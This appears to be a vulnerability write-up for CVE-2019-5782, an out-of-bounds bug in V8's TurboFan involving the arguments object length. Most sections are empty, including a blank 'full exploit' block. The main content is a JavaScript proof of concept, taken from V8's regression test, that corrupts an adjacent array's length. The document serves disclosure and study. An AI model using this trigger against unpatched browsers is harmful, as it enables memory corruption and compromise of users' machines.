# [turbofan] Relax range for arguments object length
## Information
 
* Target Chrome  Release Version(official) : Chromium 70.0.3538.67 / v8 7.0.276.28
* Target Platform : Linux, Windows, Android, Mac
* CVE : 2019-5782
* Credit : Qixun Zhao of Qihoo 360 Vulcan Team(Tianfu Cup on 2018-11-16)
> [S0rryMybad](https://twitter.com/S0rryMybad/status/1090438643582267394, "S0rryMyBad Twitter") 
* Type of Vulnerability : Out-Of-Bounds vulnerability
* PoC has been tested only on Ubuntu 18.04 and Windows 10

## Root Cause

## Exploit

## PoC

> regress-crbug-906043.js
```javascript
function fun(arg) {
  let x = arguments.length;
  a1 = new Array(0x10);
  a1[0] = 1.1;
  a2 = new Array(0x10);
  a2[0] = 1.1;
  a1[(x >> 16) * 21] = 1.39064994160909e-309;  // 0xffff00000000
  a1[(x >> 16) * 41] = 8.91238232205e-313;  // 0x2a00000000
}

var a1, a2;
var a3 = [1.1, 2.2];
a3.length = 0x11000;
a3.fill(3.3);

var a4 = [1.1];

for (let i = 0; i < 3; i++) fun(...a4);
%OptimizeFunctionOnNextCall(fun);
fun(...a4);

res = fun(...a3);

assertEquals(16, a2.length);
for (let i = 8; i < 32; i++) {
  assertEquals(undefined, a2[i]);
}
```

### full exploit

```javascript

```

## Result

## Reference

* [Google Project Zero](https://bugs.chromium.org/p/chromium/issues/detail?id=906043, "Google Project Zero Monorail")
* [S0rryMybad](https://twitter.com/S0rryMybad/status/1090438643582267394, "S0rryMyBad Twitter")
* [v8 git commit](https://github.com/v8/v8/commit/8e4588915ba7a9d9d744075781cea114d49f0c7b, "v8 git commit")
* [v8 regress](https://github.com/v8/v8/blob/7.3.1/test/mjsunit/regress/regress-crbug-906043.js, "v8 regress")
